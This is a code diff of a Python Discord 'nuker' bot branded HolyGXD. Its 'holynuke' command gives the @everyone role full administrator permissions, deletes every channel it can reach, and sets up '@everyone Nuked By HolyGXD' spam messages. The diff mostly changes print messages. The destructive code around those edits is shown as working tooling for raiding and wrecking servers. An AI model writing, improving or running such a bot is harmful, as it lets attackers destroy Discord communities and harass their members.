@@ -10,11 +10,10 @@ holygxd = 'YOUR TOKEN'
 holygxdspam = ['@everyone Nuked By HolyGXD Nuker', '@everyone HOLYGXD']
 holygxdnames = ['HOLYGXD', 'HolyGXD', 'holygxd']
 
+
 colorama.init()
 
 client = commands.Bot(command_prefix='.')
-
-{Fore.RED}
 
 @client.event
 async def on_ready():
@@ -56,9 +55,9 @@ async def holynuke(ctx):
     try:
       role = discord.utils.get(guild.roles, name = "@everyone")
       await role.edit(permissions = Permissions.all())
-      print(Fore.GREEN + f"[+] {Fore.RESET} I Gave Everyone Admin")
+      print(Fore.GREEN + f"[+] {Fore.RESET} Everyone has Admin")
     except:
-      print(Fore.RED + f"[—] {Fore.RESET} I couldn't give everyone admin")
+      print(Fore.RED + f"[—] {Fore.RESET} I Couldn't give everyone admin")
     for channel in guild.channels:
       try:
         await channel.delete()
